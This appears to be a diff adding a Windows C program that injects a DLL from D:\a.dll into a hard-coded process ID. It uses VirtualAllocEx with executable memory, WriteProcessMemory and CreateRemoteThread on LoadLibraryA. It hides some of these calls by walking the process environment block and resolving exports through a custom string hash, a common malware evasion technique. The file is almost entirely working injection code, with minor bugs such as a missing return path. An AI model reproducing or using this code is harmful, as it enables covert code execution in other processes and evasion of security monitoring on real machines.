@@ -1,0 +1,148 @@
+
+
+#include<stdio.h>
+#include<Windows.h>
+#include<winternl.h>
+#define virualoc 0x6c11198
+#define writpromem 0x90167B9
+#define cretrmtthrd 0x844E304
+using VAX = LPVOID(NTAPI*)(
+	HANDLE hProcess,
+	LPVOID lpAddress,
+	SIZE_T dwSize,
+	DWORD  flAllocationType,
+	DWORD  flProtect
+	);
+using WPM = BOOL(NTAPI*)(
+	HANDLE  hProcess,
+	LPVOID  lpBaseAddress,
+	LPCVOID lpBuffer,
+	SIZE_T  nSize,
+	SIZE_T* lpNumberOfBytesWritten
+	);
+using CRT = HANDLE(NTAPI*)(
+	HANDLE                 hProcess,
+	LPSECURITY_ATTRIBUTES  lpThreadAttributes,
+	SIZE_T                 dwStackSize,
+	LPTHREAD_START_ROUTINE lpStartAddress,
+	LPVOID                 lpParameter,
+	DWORD                  dwCreationFlags,
+	LPDWORD                lpThreadId
+	);
+PDWORD getFunctionAddressByHash(DWORD hash);
+HMODULE find_dll_base(const char* dll_name);
+DWORD getHashFromString(char* string);
+HRESULT UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA);
+int main() {
+	char shellcode[] = "D:\\a.dll";
+	SIZE_T size = 9;
+	DWORD pid = 21568;
+	HANDLE hopen = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+	PDWORD functionAddress = getFunctionAddressByHash(virualoc);
+	VAX pvax = (VAX)functionAddress;
+	LPVOID memoryalloc = pvax(hopen, NULL, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	PDWORD functionAddresss = getFunctionAddressByHash(writpromem);
+	WPM pwpm = (WPM)functionAddresss;
+	WriteProcessMemory(hopen, memoryalloc, shellcode, sizeof shellcode, NULL);
+	PDWORD functionAddressss = getFunctionAddressByHash(cretrmtthrd);
+	CRT pcrt = (CRT)functionAddressss;
+	pcrt(hopen, NULL, 0, (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryA"), memoryalloc, 0, NULL);
+	CloseHandle(hopen);
+
+}
+DWORD getHashFromString(char* string)
+{
+	size_t stringLength = strnlen_s(string, 50);
+	DWORD hash = 0x35;
+
+	for (size_t i = 0; i < stringLength; i++)
+	{
+		hash += (hash * 0xab10f29f + string[i]) & 0xffffff;
+	}
+
+	return hash;
+}
+
+HMODULE find_dll_base(const char* dll_name) {
+
+	PTEB teb = (PTEB)__readgsqword(offsetof(NT_TIB, Self));
+	PPEB_LDR_DATA loader = teb->ProcessEnvironmentBlock->Ldr;
+
+	PLIST_ENTRY head = &loader->InMemoryOrderModuleList;
+	PLIST_ENTRY curr = head->Flink;
+
+
+	do {
+		PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+		char* dllName;
+
+		UnicodeToAnsi(dllEntry->FullDllName.Buffer, &dllName);
+		char* result = strstr(dllName, dll_name);
+
+		if (result != NULL) {
+			return (HMODULE)dllEntry->DllBase;
+		}
+		curr = curr->Flink;
+	} while (curr != head);
+
+	return NULL;
+}
+
+
+HRESULT UnicodeToAnsi(LPCOLESTR pszW, LPSTR* ppszA) {
+	ULONG cbAnsi, cCharacters;
+	DWORD dwError;
+	if (pszW == NULL)
+	{
+		*ppszA = NULL;
+		return NOERROR;
+	}
+	cCharacters = wcslen(pszW) + 1;
+	cbAnsi = cCharacters * 2;
+
+	*ppszA = (LPSTR)CoTaskMemAlloc(cbAnsi);
+	if (*ppszA == NULL)
+		return E_OUTOFMEMORY;
+
+	if (WideCharToMultiByte(CP_ACP, 0, pszW, cCharacters, *ppszA, cbAnsi, NULL, NULL) == 0)
+	{
+		dwError = GetLastError();
+		CoTaskMemFree(*ppszA);
+		*ppszA = NULL;
+		return HRESULT_FROM_WIN32(dwError);
+	}
+	return NOERROR;
+}
+
+
+
+PDWORD getFunctionAddressByHash(DWORD hash)
+{
+	PDWORD functionAddress = (PDWORD)0;
+	HMODULE libraryBase = find_dll_base("KERNEL32.DLL");
+
+
+	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
+	PIMAGE_NT_HEADERS NTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);
+	DWORD_PTR exportDirectoryRVA = NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+
+	PIMAGE_EXPORT_DIRECTORY ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);
+	PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + ExportDirectory->AddressOfFunctions);
+	PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + ExportDirectory->AddressOfNames);
+	PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + ExportDirectory->AddressOfNameOrdinals);
+	for (DWORD i = 0; i < ExportDirectory->NumberOfFunctions; i++)
+	{
+		DWORD functionNameRVA = addressOfNamesRVA[i];
+		DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
+		char* functionName = (char*)functionNameVA;
+		DWORD_PTR functionAddressRVA = 0;
+		DWORD functionNameHash = getHashFromString(functionName);
+		if (functionNameHash == hash)
+		{
+			functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
+			functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
+			printf("%s : 0x%x : %p\n", functionName, functionNameHash, functionAddress);
+			return functionAddress;
+		}
+	}
+}
